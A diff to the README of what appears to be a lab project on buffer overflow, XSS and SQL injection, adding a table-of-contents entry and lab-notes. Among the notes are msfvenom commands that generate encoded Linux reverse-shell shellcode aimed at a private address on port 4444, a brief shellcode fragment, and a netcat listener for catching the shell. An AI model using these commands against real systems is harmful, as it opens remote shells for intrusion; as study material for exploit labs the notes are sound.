@@ -4,6 +4,7 @@
 **Table of Contents**
 
 - [Project: Exploring Buffer Overflow, XSS and SQL Injection Techniques](#project-exploring-buffer-overflow-xss-and-sql-injection-techniques)
+    - [Owner](#owner)
     - [Methodology](#methodology)
     - [Results and Discussion](#results-and-discussion)
 - [Buffer Overflow](#buffer-overflow)
@@ -43,13 +44,18 @@ The findings of this project will be discussed in a report, which will include a
 msfvenom -p linux/x86/shell/reverse_tcp -f c
 ```
 
+```sh
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c
+```
+
 * This enable shikata_ga_nai encoding
 ```shell
 sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f c
 ```
 
+
 * Basic encoding
-```
+```sh
 sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b "\x00\x0a\x0d\x20"
 ```
 
@@ -66,6 +72,18 @@ sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b 
 * Afterwards run the payload (reverse shell code)
 
 * From question one the payload is too short to reach the return address so the code runs normally
+
+### 2023-01-30 
+* Original metasploit shell code linux/x86/shell_reverse_tcp is missing an exit code
+
+```sh
+xcd\x80
+```
+
+* Netcat from other (attacker) terminal needs to be turned on for shellcode to work.
+```sh
+nc -lvp 80
+```
 
 ### TODO
 * Make the overflow payload str end with repeated return address.
